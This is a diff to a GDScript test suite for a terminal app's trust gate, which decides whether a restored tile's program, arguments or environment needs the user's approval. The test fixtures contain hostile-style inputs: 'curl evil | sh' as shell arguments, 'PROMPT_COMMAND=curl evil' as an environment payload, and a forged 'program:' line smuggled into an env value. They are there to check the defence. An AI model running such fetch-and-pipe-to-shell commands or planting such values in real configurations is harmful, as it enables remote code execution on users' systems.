@@ -123,35 +123,37 @@ func test_sanitize_shell_args_rejects_junk_and_caps():
 
 func test_trust_gate_flags_a_different_program():
 	assert_true(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "shell": "/bin/zsh"}}, "/bin/bash", ""))
+		{"settings": {"type": "terminal", "shell": "/bin/zsh"}}, "/bin/bash"))
 	# The restore path reads `command` first; the gate must read the same key.
 	assert_true(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "command": "/tmp/evil"}}, "/bin/bash", ""))
+		{"settings": {"type": "terminal", "command": "/tmp/evil"}}, "/bin/bash"))
 	assert_false(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "command": "/bin/bash"}}, "/bin/bash", ""))
+		{"settings": {"type": "terminal", "command": "/bin/bash"}}, "/bin/bash"))
 	assert_false(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal"}}, "/bin/bash", ""))
+		{"settings": {"type": "terminal"}}, "/bin/bash"))
+	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash"))
 
-func test_trust_gate_flags_argv_and_env_payloads():
+func test_trust_gate_flags_argv_payloads():
 	# An argv payload spawns whatever it names: `["-c", "…"]` is code, and it
 	# used to pass the gate because only `shell` was examined.
 	assert_true(PaneTypes.tile_spawns_untrusted(
 		{"settings": {"type": "terminal", "shell_args": ["-c", "curl evil | sh"]}},
-		"/bin/bash", ""))
-	# An env payload is code too once a shell evaluates it (PROMPT_COMMAND,
-	# BASH_ENV), so a non-default environment is a trust decision as well.
-	assert_true(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "shell_env": "PROMPT_COMMAND=curl evil"}},
-		"/bin/bash", ""))
+		"/bin/bash"))
 	assert_false(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "shell_env": "   "}}, "/bin/bash", ""))
+		{"settings": {"type": "terminal", "shell_args": []}}, "/bin/bash"))
 
-func test_trust_gate_allows_the_users_own_defaults():
-	# A tile that repeats the user's configured env/args is not a new decision.
+func test_trust_gate_has_no_env_authority():
+	# Env is not a file decision: restore strips a tile's `shell_env` with a
+	# notice and never lets it reach a spawn, so the gate has no env clause.
+	# (The old one never fired either — apply_to_terminal overwrote the file
+	# env with the user's global before spawn; that is exactly the accident
+	# the user-owned env model retired.)
 	assert_false(PaneTypes.tile_spawns_untrusted(
-		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim", "shell_args": []}},
-		"/bin/bash", "EDITOR=vim"))
-	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash", ""))
+		{"settings": {"type": "terminal", "shell_env": "PROMPT_COMMAND=curl evil"}},
+		"/bin/bash"))
+	assert_false(PaneTypes.tile_spawns_untrusted(
+		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim"}},
+		"/bin/bash"))
 
 # ── PaneTypes.untrusted_plan (what the trust dialog shows) ─────────────
 
@@ -160,51 +162,22 @@ func test_untrusted_plan_lists_what_will_run():
 		"settings": {
 			"type": "terminal", "command": "/bin/zsh",
 			"shell_args": ["-c", "curl evil | sh"],
-			"shell_env": "PYTHONPATH=/tmp/mod\nPATH=/tmp/bin",
+			"shell_env": "PYTHONPATH=/tmp/mod",
 		},
-	}, "/bin/bash", "")
+	}, "/bin/bash")
 	var text := "\n".join(plan)
 	assert_string_contains(text, "program: /bin/zsh")
 	assert_string_contains(text, "arguments: -c, curl evil | sh")
-	assert_string_contains(text, "environment: PYTHONPATH=/tmp/mod")
-	assert_string_contains(text, "environment: PATH=/tmp/bin")
+	assert_false(text.contains("environment"), "env is not a file decision — nothing to show")
 
 func test_untrusted_plan_is_empty_for_a_trusted_tile():
-	assert_eq(PaneTypes.untrusted_plan(
-		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim"}}, "/bin/bash", "EDITOR=vim").size(), 0)
-	assert_eq(PaneTypes.untrusted_plan({"settings": {"type": "terminal"}}, "/bin/bash", "").size(), 0)
+	assert_eq(PaneTypes.untrusted_plan({"settings": {"type": "terminal"}}, "/bin/bash").size(), 0)
 
-func test_untrusted_plan_labels_every_env_line():
-	# An env blob is a multi-line KEY=value list, so each entry gets its own
-	# line — and every one keeps the "environment:" prefix, so a value cannot
-	# impersonate a "program:" or "arguments:" line.
-	var plan = PaneTypes.untrusted_plan({
-		"settings": {"type": "terminal", "shell_env": "A=1\nprogram: /bin/bash\nB=2"},
-	}, "/bin/bash", "")
-	assert_eq(plan.size(), 3, "each env entry is its own labelled line")
-	for line in plan:
-		assert_string_contains(line, "environment: ", "every env line stays labelled")
-	assert_eq(plan[1], "environment: program: /bin/bash", "a forged line stays inside its label")
-
-	# A carriage return would let a value overwrite its own rendered line.
-	var cr = PaneTypes.untrusted_plan(
-		{"settings": {"type": "terminal", "shell_env": "A=1\rB=2"}}, "/bin/bash", "")
-	assert_false("\r" in cr[0], "control characters are escaped, not rendered")
-
-func test_untrusted_plan_caps_env_lines_and_value_length():
-	var many: Array[String] = []
-	for i in PaneTypes.TRUST_MAX_ENV_LINES + 5:
-		many.append("K%d=v" % i)
+func test_untrusted_plan_caps_value_length():
+	var long_program := "x".repeat(PaneTypes.TRUST_MAX_VALUE_LEN + 50)
 	var plan = PaneTypes.untrusted_plan(
-		{"settings": {"type": "terminal", "shell_env": "\n".join(many)}}, "/bin/bash", "")
-	assert_eq(plan.size(), PaneTypes.TRUST_MAX_ENV_LINES + 1,
-		"env lines are capped, with one line saying how many were hidden")
-	assert_string_contains(plan[plan.size() - 1], "more line")
-
-	var long_value := "V=" + "x".repeat(PaneTypes.TRUST_MAX_VALUE_LEN + 50)
-	var capped = PaneTypes.untrusted_plan(
-		{"settings": {"type": "terminal", "shell_env": long_value}}, "/bin/bash", "")
-	assert_true(capped[0].length() < long_value.length() + 16,
+		{"settings": {"type": "terminal", "command": long_program}}, "/bin/bash")
+	assert_true(plan[0].length() < long_program.length() + 16,
 		"an oversized value must be truncated for display")
 
 # ── PaneBody typed settings application ────────────────────────────────
